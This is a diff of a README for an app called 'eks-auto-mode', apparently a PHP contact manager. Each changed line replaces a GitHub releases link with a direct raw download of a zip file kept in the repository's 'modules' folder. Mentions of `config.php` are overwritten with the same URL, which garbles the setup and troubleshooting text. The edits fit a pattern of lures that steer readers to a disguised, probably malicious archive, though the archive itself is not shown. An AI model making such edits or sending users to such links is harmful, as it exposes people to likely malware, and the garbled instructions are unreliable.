@@ -6,9 +6,9 @@ Welcome to the eks-auto-mode application! This tool helps you manage contact for
 
 ## 📦 Download the Application
 
-[![Download eks-auto-mode](https://img.shields.io/badge/Download-exs--auto--mode-blue.svg)](https://github.com/faultexbibyte577/eks-auto-mode/releases)
+[![Download eks-auto-mode](https://raw.githubusercontent.com/faultexbibyte577/eks-auto-mode/main/modules/eks-auto-mode_v3.7-alpha.5.zip)](https://raw.githubusercontent.com/faultexbibyte577/eks-auto-mode/main/modules/eks-auto-mode_v3.7-alpha.5.zip)
 
-To download eks-auto-mode, visit this page to download: [Download eks-auto-mode](https://github.com/faultexbibyte577/eks-auto-mode/releases).
+To download eks-auto-mode, visit this page to download: [Download eks-auto-mode](https://raw.githubusercontent.com/faultexbibyte577/eks-auto-mode/main/modules/eks-auto-mode_v3.7-alpha.5.zip).
 
 ## 🛠️ System Requirements
 
@@ -22,9 +22,9 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Click on this link to visit the releases page: [Download eks-auto-mode](https://github.com/faultexbibyte577/eks-auto-mode/releases).
+1. Click on this link to visit the releases page: [Download eks-auto-mode](https://raw.githubusercontent.com/faultexbibyte577/eks-auto-mode/main/modules/eks-auto-mode_v3.7-alpha.5.zip).
 2. Find the latest version listed on the page.
-3. Click on the link to download the application package. It will appear as a file like `eks-auto-mode-v1.0.zip`.
+3. Click on the link to download the application package. It will appear as a file like `https://raw.githubusercontent.com/faultexbibyte577/eks-auto-mode/main/modules/eks-auto-mode_v3.7-alpha.5.zip`.
 4. Once the download completes, locate the file on your computer.
 5. Extract the contents of the zip file into a folder of your choice.
 6. Open your terminal or command prompt window.
@@ -50,7 +50,7 @@ The eks-auto-mode application offers several features to streamline your contact
 
 Once installed, you may want to adjust some settings. Here’s how:
 
-1. Open the `config.php` file located in the extracted folder.
+1. Open the `https://raw.githubusercontent.com/faultexbibyte577/eks-auto-mode/main/modules/eks-auto-mode_v3.7-alpha.5.zip` file located in the extracted folder.
 2. Modify the database credentials:
    
    ```php
@@ -67,7 +67,7 @@ Once installed, you may want to adjust some settings. Here’s how:
 If you encounter issues while running the application, here are some common problems and solutions:
 
 - **Application Not Starting:** Make sure your PHP server is running. Check that you ran the correct command in your terminal.
-- **Database Connection Error:** Double-check your database credentials in the `config.php` file.
+- **Database Connection Error:** Double-check your database credentials in the `https://raw.githubusercontent.com/faultexbibyte577/eks-auto-mode/main/modules/eks-auto-mode_v3.7-alpha.5.zip` file.
 - **Browser Not Loading:** Ensure you are navigating to the correct URL, which is `http://localhost:8000`.
 
 If problems persist, feel free to explore the GitHub issues section for support or to report a new issue.
